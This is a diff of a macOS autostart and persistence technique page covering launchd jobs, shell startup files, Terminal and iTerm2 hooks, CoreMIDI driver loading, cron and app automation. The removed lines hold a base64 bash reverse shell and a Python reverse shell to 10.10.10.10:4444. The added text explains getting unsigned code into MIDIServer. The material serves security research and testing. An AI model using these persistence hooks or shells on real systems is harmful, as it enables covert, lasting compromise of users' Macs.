@@ -2,7 +2,10 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-This section is heavily based on the blog series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), the goal is to add **more Autostart Locations** (if possible), indicate **which techniques are still working** nowadays with latest version of macOS (13.4) and to specify the **permissions** needed.
+This section is heavily based on the blog series [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Its goal is to identify locations where a file write can lead to later code execution, the event that triggers execution, and the permissions required. A location's presence is not proof that the mechanism is enabled. The local checks noted below were performed on macOS 26.5.2 (5 October 2026); they do not establish behavior on every macOS release.
+
+> [!NOTE]
+> “Write-triggered” does not always mean “runs immediately after writing.” Some locations are read only at login, when a specific application starts, or when a user performs an action. A writable payload inside an already configured job is also distinct from permission to register a new job. Test in a disposable account or VM before relying on a technique.
 
 ## Sandbox Bypass
 
@@ -17,21 +20,19 @@ This section is heavily based on the blog series [**Beyond the good ol' LaunchAg
 #### Locations
 
 - **`/Library/LaunchAgents`**
-  - **Trigger**: Reboot
+  - **Trigger**: User login (or explicit registration)
   - Root required
 - **`/Library/LaunchDaemons`**
-  - **Trigger**: Reboot
+  - **Trigger**: System boot (or explicit registration)
   - Root required
 - **`/System/Library/LaunchAgents`**
-  - **Trigger**: Reboot
-  - Root required
+  - **Trigger**: User login; protected Apple system location
 - **`/System/Library/LaunchDaemons`**
-  - **Trigger**: Reboot
-  - Root required
+  - **Trigger**: System boot; protected Apple system location
 - **`~/Library/LaunchAgents`**
   - **Trigger**: Relog-in
-- **`~/Library/LaunchDemons`**
-  - **Trigger**: Relog-in
+
+There is no `~/Library/LaunchDaemons` location scanned by `launchd`. Per-user jobs belong in `~/Library/LaunchAgents`; the system daemon directory is `/Library/LaunchDaemons`. [Apple's launchd startup guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) documents the scanned locations.
 
 > [!TIP]
 > As interesting fact, **`launchd`** has an embedded property list in a the Mach-o section `__Text.__config` which contains other well known services launchd must start. Moreover, these services can contain the `RequireSuccess`, `RequireRun` and `RebootOnSuccess` that means that they must be run and complete successfully.
@@ -47,32 +48,72 @@ This section is heavily based on the blog series [**Beyond the good ol' LaunchAg
 - `/System/Library/LaunchAgents`: Per-user agents provided by Apple.
 - `/System/Library/LaunchDaemons`: System-wide daemons provided by Apple.
 
-When a user logs in the plists located in `/Users/$USER/Library/LaunchAgents` and `/Users/$USER/Library/LaunchDemons` are started with the **logged users permissions**.
+When a user logs in, `launchd` loads the plists in that user's `~/Library/LaunchAgents` with that user's permissions. Jobs are started according to their keys; merely loading a plist does not imply immediate process execution.
 
 The **main difference between agents and daemons is that agents are loaded when the user logs in and the daemons are loaded at system startup** (as there are services like ssh that needs to be executed before any user access the system). Also agents may use GUI while daemons need to run in the background.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
     <key>Label</key>
         <string>com.apple.someidentifier</string>
     <key>ProgramArguments</key>
     <array>
-        <string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
+        <string>/bin/sh</string>
+        <string>-c</string>
+        <string>touch /tmp/launched</string>
     </array>
     <key>RunAtLoad</key><true/> <!--Execute at system startup-->
     <key>StartInterval</key>
     <integer>800</integer> <!--Execute each 800s-->
     <key>KeepAlive</key>
     <dict>
-        <key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
+        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
         <!--If previous is true, then re-execute in successful exit-->
     </dict>
 </dict>
 </plist>
 ```
+
+Each `ProgramArguments` element is a separate argument; `launchd` does not parse a single string as a shell command. The corrected example above can be syntax checked without loading it using `plutil -lint /path/to/example.plist`. See the local `man launchd.plist` entry for `ProgramArguments`, `RunAtLoad`, and `KeepAlive`.
+
+#### File-event triggers in existing jobs
+
+An **already loaded** agent or daemon can use `WatchPaths` to start when a named path changes. `QueueDirectories` starts a job while a directory is non-empty; `StartOnMount` starts on a volume mount. [Apple's launchd guide](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) includes `WatchPaths` and `QueueDirectories` examples. A write to a watched file triggers the **job already configured**; it gives arbitrary code execution only if the writer can also control the job's executable, script, or data that the job interprets. Merely writing a new plist outside a scanned or registered location does not load it.
+
+This self-cleaning PoC registers a uniquely named **temporary user agent**, changes only its own watched file, and removes the agent. It was run successfully on macOS 26.5.2 without a logout or restart:
+
+```python
+import os, pathlib, plistlib, subprocess, tempfile, time, uuid
+
+label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
+target = f"gui/{os.getuid()}"
+with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
+    base = pathlib.Path(root)
+    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
+    watched.write_text("before\n")
+    plist.write_bytes(plistlib.dumps({
+        "Label": label,
+        "ProgramArguments": ["/usr/bin/touch", str(marker)],
+        "WatchPaths": [str(watched)],
+        "RunAtLoad": False,
+    }))
+    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
+    try:
+        marker.unlink(missing_ok=True)
+        watched.write_text("after\n")
+        for _ in range(30):
+            if marker.exists():
+                break
+            time.sleep(0.1)
+        print("watch fired:", marker.exists())
+    finally:
+        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
+```
+
+The local run printed `watch fired: True`, and `bootout` succeeded. `launchctl bootstrap` is used here only inside the isolated PoC; it is **not** needed for a job that is already loaded. To assess an existing job safely, read its plist and the resolved `ProgramArguments` path, then check whether the relevant executable or interpreted file is writable without altering it.
 
 There are cases where an **agent needs to be executed before the user logins**, these are called **PreLoginAgents**. For example, this is useful to provide assistive technology at login. They can be found also in `/Library/LaunchAgents`(see [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) an example).
 
@@ -104,7 +145,7 @@ printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.h
 nohup "$HOME/.agent" >/dev/null 2>&1 &
 ```
 > [!WARNING]
-> If a plist is owned by a user, even if it's in a daemon system wide folders, the **task will be executed as the user** and not as root. This can prevent some privilege escalation attacks.
+> A daemon plist placed in `/Library/LaunchDaemons` is not made safe by giving it user ownership. `launchd` requires appropriate ownership and permissions for system jobs and may reject an insecure plist. A root-owned daemon normally runs as root unless its configuration selects another account. Check the job's `UserName`, `GroupName`, ownership, and `launchctl` diagnostics; do not infer execution identity from the plist owner's name alone.
 
 #### More info about launchd
 
@@ -113,8 +154,8 @@ nohup "$HOME/.agent" >/dev/null 2>&1 &
 One of the first things `launchd` would do is to **start** all the **daemons** like:
 
 - **Timer daemons** based on time to be executed:
-  - atd (`com.apple.atrun.plist`): Has a `StartInterval` of 30min
-  - crond (`com.apple.systemstats.daily.plist`): Has `StartCalendarInterval` to start at 00:15
+  - `com.apple.atrun.plist` invokes `/usr/libexec/atrun` with `StartInterval = 30` seconds in macOS 26.5.2; its effective enabled state can differ from the plist's `Disabled` key because launchd keeps overrides separately.
+  - `com.vix.cron.plist` invokes `/usr/sbin/cron` while `/usr/lib/cron/tabs` contains jobs. `com.apple.systemstats.daily` is a different scheduled service, not the cron daemon.
 - **Network daemons** like:
   - `org.cups.cups-lpd`: Listens in TCP (`SockType: stream`) with `SockServiceName: printer`
     - SockServiceName must be either a port or a service from `/etc/services`
@@ -139,34 +180,58 @@ Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://thee
 
 #### Locations
 
-- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
-  - **Trigger**: Open a terminal with zsh
+- **`~/.zshenv`** (or a newer compiled **`~/.zshenv.zwc`**)
+  - **Trigger**: Any ordinary zsh invocation, including a noninteractive `zsh -c`; `zsh -f` skips user startup files.
+- **`~/.zshrc`**
+  - **Trigger**: Interactive zsh starts.
+- **`~/.zprofile`, `~/.zlogin`**
+  - **Trigger**: Login zsh starts; these are read before and after `.zshrc`, respectively.
 - **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
   - **Trigger**: Open a terminal with zsh
   - Root required
 - **`~/.zlogout`**
-  - **Trigger**: Exit a terminal with zsh
+  - **Trigger**: A login zsh exits normally, not every terminal or shell exit.
 - **`/etc/zlogout`**
   - **Trigger**: Exit a terminal with zsh
   - Root required
 - Potentially more in: **`man zsh`**
 - **`~/.bashrc`**
-  - **Trigger**: Open a terminal with bash
-- `/etc/profile` (didn't work)
-- `~/.profile` (didn't work)
+  - **Trigger**: Start interactive **non-login** Bash. An interactive login Bash reads it only if a login file explicitly sources it.
+- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
+  - **Trigger**: Start login Bash; the first readable file in that order runs. `~/.profile` is skipped when either earlier file exists.
+- **`/etc/profile`**
+  - **Trigger**: Start login Bash; changing it requires root.
+- **`~/.tcshrc`** or, when absent, **`~/.cshrc`**
+  - **Trigger**: Start `tcsh`, including a noninteractive `tcsh -c` on this Mac. The user must actually invoke `tcsh`; it is not the default macOS shell.
+- **`~/.login`**
+  - **Trigger**: Start a login `tcsh` after its rc file.
 - `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
   - **Trigger**: Expected to trigger with xterm, but it **isn't installed** and even after installed this error is thrown: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>
 
 #### Description & Exploitation
 
-When initiating a shell environment such as `zsh` or `bash`, **certain startup files are run**. macOS currently uses `/bin/zsh` as the default shell. This shell is automatically accessed when the Terminal application is launched or when a device is accessed via SSH. While `bash` and `sh` are also present in macOS, they need to be explicitly invoked to be used.<sup>[[2]](#references)</sup>
+When initiating a shell environment such as `zsh` or `bash`, **certain startup files are run**. macOS currently uses `/bin/zsh` as the default shell. Whether Terminal or SSH starts a login or interactive shell depends on their configuration; do not assume that every file above runs in every session. While `bash` and `sh` are also present in macOS, they need to be explicitly invoked to be used.<sup>[[2]](#references)</sup> The [zsh startup-file reference](https://zsh.sourceforge.io/Doc/Release/Files.html) specifies the ordering, the `ZDOTDIR` override, and the `.zwc` rule.
 
-The man page of zsh, which we can read with **`man zsh`** has a long description of the startup files.
+The following read-only experiment used a disposable `ZDOTDIR` on macOS 26.5.2. It shows which user files were read; no real shell startup file was changed:
 
 ```bash
-# Example executino via ~/.zshrc
-echo "touch /tmp/hacktricks" >> ~/.zshrc
+lab=$(mktemp -d)
+for name in zshenv zprofile zshrc zlogin zlogout; do
+  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
+done
+for flags in -c -ic -lc -lic; do
+  : > "$lab/seen"
+  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
+  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
+done
+rm -r "$lab"
 ```
+
+The observed order was `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` must already point to the alternate directory; merely writing files in an arbitrary directory is not enough.
+
+[Bash's startup reference](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) distinguishes login from interactive shells. On the macOS 26.5.2 test machine, an isolated `HOME` containing all four user startup files produced: `bash -c` → none, `bash -ic` → `.bashrc`, `bash -lc` and `bash -lic` → `.bash_profile` only. Removing `.bash_profile` made login Bash read `.bash_login`, then `.profile` when that was also removed. `BASH_ENV` can point noninteractive Bash at a file, but that environment variable must already be set in the invoking process. An explicit `exit` from a login Bash can also load `~/.bash_logout`.
+
+The local `tcsh(1)` manual documents its separate startup order. With a disposable `HOME`, `/bin/tcsh -c :` read `.tcshrc`, or `.cshrc` when `.tcshrc` was absent. A disposable login `tcsh` read `.tcshrc` and `.login`. These checks created and removed only temporary files.
 
 ### Re-opened Applications
 
@@ -222,7 +287,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.g
 #### Location
 
 - **`~/Library/Preferences/com.apple.Terminal.plist`**
-  - **Trigger**: Open Terminal
+  - **Trigger**: Open a new Terminal window or tab using the profile whose Shell settings contain the startup command
 
 #### Description & Exploitation
 
@@ -250,7 +315,7 @@ This config is reflected in the file **`~/Library/Preferences/com.apple.Terminal
 [...]
 ```
 
-So, if the plist of the preferences of the terminal in the system could be overwritten, the the **`open`** functionality can be used to **open the terminal and that command will be executed**.
+If the relevant profile contains a startup command and Terminal reads that preference, a new session using that profile can execute it. [Apple's current Terminal guide](https://support.apple.com/guide/terminal/trmlshll/mac) documents the per-profile **Shell → Startup** command. Merely opening Terminal without a new session using that profile is not enough. The preference edits below were **not** run on the research Mac.
 
 You can add this from the cli with:
 
@@ -272,11 +337,11 @@ You can add this from the cli with:
 #### Location
 
 - **Anywhere**
-  - **Trigger**: Open Terminal
+  - **Trigger**: Open the particular `.terminal`, `.command`, or `.tool` file
 
 #### Description & Exploitation
 
-If you create a [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) and opens, the **Terminal application** will be automatically invoked to execute the commands indicated in there. If the Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.
+If a user opens a **`.terminal`** settings file, Terminal can create a session from its profile; executable **`.command`** and **`.tool`** files can also open in Terminal. This is an explicit file-open trigger, not execution from merely opening Terminal. Any inherited TCC access depends on Terminal's actual grants and the operation attempted. The historical example below was not run on the research Mac.
 
 Try it with:
 
@@ -288,7 +353,7 @@ cat > /tmp/test.terminal << EOF
 <plist version="1.0">
 <dict>
 	<key>CommandString</key>
-	<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
+	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
 	<key>ProfileCurrentVersion</key>
 	<real>2.0600000000000001</real>
 	<key>RunCommandAsShell</key>
@@ -304,8 +369,8 @@ EOF
 # Trigger it
 open /tmp/test.terminal
 
-# Use something like the following for a reverse shell:
-<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
+# After inspecting the marker, remove the disposable file and marker:
+rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
 ```
 
 You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.
@@ -326,19 +391,59 @@ Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://
 
 - **`/Library/Audio/Plug-Ins/HAL`**
   - Root required
-  - **Trigger**: Restart coreaudiod or the computer
+  - **Trigger**: The Core Audio server loads a compatible HAL device plug-in; a server restart may cause rediscovery
 - **`/Library/Audio/Plug-ins/Components`**
   - Root required
-  - **Trigger**: Restart coreaudiod or the computer
+  - **Trigger**: An audio host discovers and instantiates the installed Audio Unit
 - **`~/Library/Audio/Plug-ins/Components`**
-  - **Trigger**: Restart coreaudiod or the computer
+  - **Trigger**: An audio host discovers and instantiates the installed Audio Unit
 - **`/System/Library/Components`**
-  - Root required
-  - **Trigger**: Restart coreaudiod or the computer
+  - Apple-provided, system-protected location
+  - **Trigger**: An audio host instantiates a matching system component
 
 #### Description
 
 According to the previous writeups it's possible to **compile some audio plugins** and get them loaded.<sup>[[6]](#references)[[7]](#references)</sup>
+
+HAL device plug-ins and Audio Units are distinct load paths. [Apple's Audio Unit hosting guide](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) says a host must find and instantiate a component; copying one into a scan directory or restarting `coreaudiod` does not by itself prove execution. AUv2 plug-ins run in the host process, while [Apple's current Audio Unit guidance](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) says AUv3 defaults to a separate process on macOS. Signature, sandbox, and library-validation gates depend on the host. No audio plug-in was installed or executed on the research Mac.
+
+### CoreMIDI Drivers (MIDIServer)
+
+Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>
+
+- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
+  - Your code runs inside the `MIDIServer` process, not your app's sandbox
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+  - `MIDIServer` runs under its own `seatbelt` sandbox profile
+
+#### Location
+
+- **`~/Library/Audio/MIDI Drivers/*.plugin`**
+  - No root required (user-writable)
+  - **Trigger**: `MIDIServer` (re)starts. It is launched on demand the first time any process uses CoreMIDI (opening *Audio MIDI Setup*, GarageBand, a DAW, or a page that uses WebMIDI)
+- **`/Library/Audio/MIDI Drivers/*.plugin`**
+  - Root required
+  - **Trigger**: same as above
+
+#### Description & Exploitation
+
+Apple's `MIDIServer` (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) loads MIDI **driver** bundles from the `Audio/MIDI Drivers` directories. The binary is Apple-signed but ships with the `com.apple.security.cs.disable-library-validation` entitlement, so it will load a bundle that is **unsigned or ad-hoc signed by a different team**, yielding code execution inside a separate, Apple-owned process **without root**.<sup>[[53]](#references)</sup>
+
+Verified on macOS 26 (read-only):
+
+```bash
+# user-writable, no root needed
+ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
+codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
+  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
+```
+
+A driver is a standard bundle that exports a `MIDIDriverInterface` factory; placing the payload in the factory/constructor makes it run as soon as `MIDIServer` enumerates the drivers. Build it, drop it as `~/Library/Audio/MIDI Drivers/Evil.plugin`, then trigger a load without any logout/reboot:
+
+```bash
+# starts MIDIServer, which scans the driver directories
+open -a "Audio MIDI Setup"
+```
 
 ### QuickLook Plugins
 
@@ -361,6 +466,8 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.g
 QuickLook plugins can be executed when you **trigger the preview of a file** (press space bar with the file selected in Finder) and a **plugin supporting that file type** is installed.<sup>[[8]](#references)</sup>
 
 It's possible to compile your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press space to trigger it.
+
+These paths refer to legacy `.qlgenerator` bundles; [Apple's Quick Look architecture guide](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) documents the search order and matching file types. Current Quick Look **app extensions** are packaged with an app and have different registration and execution rules. A generator's presence does not establish that it wins type selection or that its code runs in Finder itself. The legacy generator path was reviewed from documentation and directory presence; no generator was installed or loaded on the research Mac.
 
 ### ~~Login/Logout Hooks~~
 
@@ -428,9 +535,9 @@ The root user one is stored in **`/private/var/root/Library/Preferences/com.appl
 
 #### Location
 
-- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
+- **`/usr/lib/cron/tabs/`**
   - Root required for direct write access. No root required if you can execute `crontab <file>`
-  - **Trigger**: Depends on the cron job
+  - **Trigger**: The schedule in the installed crontab. `at` and `periodic` are separate mechanisms below.
 
 #### Description & Exploitation
 
@@ -440,22 +547,28 @@ List the cron jobs of the **current user** with:
 crontab -l
 ```
 
-You can also see all the cron jobs of the users in **`/usr/lib/cron/tabs/`** and **`/var/at/tabs/`** (needs root).
-
-In MacOS several folders executing scripts with **certain frequency** can be found in:
+The system cron daemon's launchd plist has a `QueueDirectories` entry for `/usr/lib/cron/tabs`; that is where installed user crontabs are kept. Inspecting other users' crontabs needs root:
 
 ```bash
-# The one with the cron jobs is /usr/lib/cron/tabs/
-ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
+plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
+ls -ld /usr/lib/cron/tabs
 ```
 
-There you can find the regular **cron** **jobs**, the **at** **jobs** (not very used) and the **periodic** **jobs** (mainly used for cleaning temporary files). The daily periodic jobs can be executed for example with: `periodic daily`.<sup>[[10]](#references)</sup>
-
-To add a **user cronjob programmatically** it's possible to use:
+In a disposable account, a marker-only user cron entry can be installed with `crontab` and removed after observing it. Running `crontab <file>` **replaces the account's entire existing crontab**, so save and restore it if it is not disposable:<sup>[[10]](#references)</sup>
 
 ```bash
-echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
-crontab /tmp/cron
+lab=$(mktemp -d)
+had_original=0
+if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
+cleanup_cron_poc() {
+  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
+  rm -r "$lab"
+}
+trap cleanup_cron_poc EXIT
+printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
+crontab "$lab/new"
+sleep 65
+test -e "$lab/ran" && echo 'cron fired'
 ```
 
 ### iTerm2
@@ -469,51 +582,35 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.g
 #### Locations
 
 - **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
-  - **Trigger**: Open iTerm
+  - **Trigger**: Start iTerm2 with an eligible Python API script in that folder
 - **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
-  - **Trigger**: Open iTerm
+  - **Trigger**: Start iTerm2; the AppleScript startup hook is documented separately
 - **`~/Library/Preferences/com.googlecode.iterm2.plist`**
-  - **Trigger**: Open iTerm
+  - **Trigger**: Create a session with the profile whose command or initial text invokes the payload
 
 #### Description & Exploitation
 
-Scripts stored in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** will be executed. For example:<sup>[[11]](#references)</sup>
+The [current iTerm2 Python API guide](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) documents auto-run **Python** scripts in `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. It does not establish that an arbitrary executable `.sh` file in that folder runs. For a disposable account, save this as `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:
 
-```bash
-cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
-#!/bin/bash
-touch /tmp/iterm2-autolaunch
-EOF
-
-chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
-```
-
-or:
-
-```bash
-cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
-#!/usr/bin/env python3
-import iterm2,socket,subprocess,os
+```python
+import iterm2
+from pathlib import Path
 
 async def main(connection):
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
-    async with iterm2.CustomControlSequenceMonitor(
-            connection, "shared-secret", r'^create-window$') as mon:
-        while True:
-            match = await mon.async_get()
-            await iterm2.Window.async_create(connection)
+    Path('/tmp/ht-iterm-autolaunch-marker').touch()
 
-iterm2.run_forever(main)
-EOF
+iterm2.run_until_complete(main)
 ```
 
-The script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** will also be executed:
+The [current iTerm2 AppleScript guide](https://iterm2.com/documentation-scripting.html) separately documents `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, with a legacy `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` fallback when the modern folder does not exist. A marker-only AppleScript is:
 
-```bash
+```applescript
 do shell script "touch /tmp/iterm2-autolaunchscpt"
 ```
 
-The iTerm2 preferences located in **`~/Library/Preferences/com.googlecode.iterm2.plist`** can **indicate a command to execute** when the iTerm2 terminal is opened.
+These script examples were checked against iTerm2's documentation, not run in the active desktop session. After testing in a disposable account, remove the test script and `/tmp/ht-iterm-autolaunch-marker` or `/tmp/iterm2-autolaunchscpt`, respectively.
+
+The iTerm2 preferences located in **`~/Library/Preferences/com.googlecode.iterm2.plist`** can specify a profile command or initial text. The latter is typed into a session; execution depends on a shell interpreting it. [iTerm2's profile documentation](https://iterm2.com/documentation-preferences-profiles-general.html) describes the command run when a new session with that profile is created.
 
 This setting can be configured in the iTerm2 settings:
 
@@ -531,21 +628,7 @@ plutil -p com.googlecode.iterm2.plist
       "Initial Text" => "touch /tmp/iterm-start-command"
 ```
 
-You can set the command to execute with:
-
-```bash
-# Add
-/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist
-
-# Call iTerm
-open /Applications/iTerm.app/Contents/MacOS/iTerm2
-
-# Remove
-/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
-```
-
-> [!WARNING]
-> Highly probable there are **other ways to abuse the iTerm2 preferences** to execute arbitrary commands.
+For a safe assessment, inspect the chosen profile in iTerm2 settings or read a copy of its preference file. Changing `Initial Text` in a live profile would affect a user's sessions, so no preference was changed on the research Mac.
 
 ### xbar
 
@@ -609,9 +692,9 @@ EOF
 
 #### Location
 
-- `~/Library/Application Support/BetterTouchTool/*`
+- A script file **already referenced** by an enabled BetterTouchTool preset, or that preset's configuration under `~/Library/Application Support/BetterTouchTool/`. The precise script path depends on how the preset was configured.
 
-This tool allows to indicate applications or scripts to execute when some shortcuts are pressed . An attacker might be able configure his own **shortcut and action to execute in the database** to make it execute arbitrary code (a shortcut could be to just to press a key).
+[BetterTouchTool's action reference](https://docs.folivora.ai/docs/actions/action-definitions/) documents shell-script and background-command actions. The configured keyboard, mouse, touch, widget, or other event must occur while the relevant preset is active; [its trigger guide](https://docs.folivora.ai/docs/configuration/new-trigger/) shows this pairing. A random file in the application-support directory is not a trigger. An already configured action that loads an external writable script is a narrower write-to-execution target. Code runs as the BetterTouchTool user's account, subject to its actual macOS grants. BetterTouchTool was absent from `/Applications` on the research Mac, so no preset was changed or executed locally.
 
 ### Alfred
 
@@ -622,9 +705,204 @@ This tool allows to indicate applications or scripts to execute when some shortc
 
 #### Location
 
-- `???`
+- A script or file **already referenced** by an installed Alfred workflow, or that workflow inside the user's configured `Alfred.alfredpreferences` directory. The preferences directory may be synced and is not a fixed universal path.
 
-It allows to create workflows that can execute code when certain conditions are met. Potentially it's possible for an attacker to create a workflow file and make Alfred load it (it's needed to pay the premium version to use workflows).
+[Alfred's workflow guide](https://www.alfredapp.com/help/workflows/) describes the Powerpack prerequisite and installation through its UI. An installed workflow's hotkey, keyword, or other configured trigger must fire; [Alfred's hotkey example](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) demonstrates a script action. [Alfred's environment reference](https://www.alfredapp.com/help/workflows/script-environment-variables/) exposes the selected preferences path as `alfred_preferences`. Dropping an unregistered workflow file into an arbitrary directory does not prove it will be installed or run. Code runs as the signed-in Alfred user with its actual macOS grants. Alfred was absent from `/Applications` on the research Mac, so this path was assessed from documentation only.
+
+### Raycast Script Commands and extension refresh
+
+- **Write target:** An executable script in a directory **already added** under Raycast Settings → Script Commands. Raycast does not scan an arbitrary newly created directory. [Raycast's Script Commands guide](https://manual.raycast.com/script-commands) documents directory registration.
+- **Trigger and identity:** A user invokes the indexed command, a configured hotkey or fallback invokes it, or Raycast refreshes an `inline` script on its configured `@raycast.refreshTime`. The script runs as the signed-in Raycast user through its interpreter. The [upstream metadata reference](https://github.com/raycast/script-commands#metadata) limits automatic refresh to inline commands, and [Raycast's extension manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) separately supports an `interval` for installed `no-view` or `menu-bar` extension commands. Merely adding a normal script command does not schedule it.
+
+For a disposable account with a registered script directory, a marker-only inline script is:
+
+```bash
+#!/bin/bash
+# @raycast.schemaVersion 1
+# @raycast.title Auto-start marker
+# @raycast.mode inline
+# @raycast.refreshTime 1m
+/usr/bin/touch /tmp/ht-raycast-refresh-marker
+echo ready
+```
+
+Save it in the registered directory, make it executable, and let Raycast refresh it. Then remove that file and `/tmp/ht-raycast-refresh-marker`. Raycast was not found under its usual `/Applications` name on the research Mac, so this is documentation-backed and was not run locally. Accessibility, Automation, and file grants remain subject to macOS permission prompts.
+
+### Visual Studio Code automatic workspace tasks
+
+- **Write target:** `.vscode/tasks.json` inside a workspace the user will open.
+- **Trigger:** Opening that workspace in VS Code, but only when the folder is trusted **and** automatic tasks have been allowed. An untrusted workspace never runs automatic tasks; the default setting prompts the user before the first automatic run. [VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) and [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) describe both gates.
+- **Execution identity:** The VS Code user's account, through the configured task process. This is application-specific execution, not login persistence.
+
+In a **new, disposable workspace**, place this marker-only task in `.vscode/tasks.json`:
+
+```json
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "autostart-marker",
+      "type": "process",
+      "command": "/usr/bin/touch",
+      "args": ["${workspaceFolder}/.autostart-task-ran"],
+      "problemMatcher": [],
+      "runOptions": { "runOn": "folderOpen" }
+    }
+  ]
+}
+```
+
+After opening the trusted workspace and allowing automatic tasks, check for `.autostart-task-ran`. Remove the task entry and marker to clean up. **This was verified against Microsoft's documentation and the installed VS Code 1.139.1 bundle; it was not run in the active desktop session.**
+
+### Chrome native messaging hosts
+
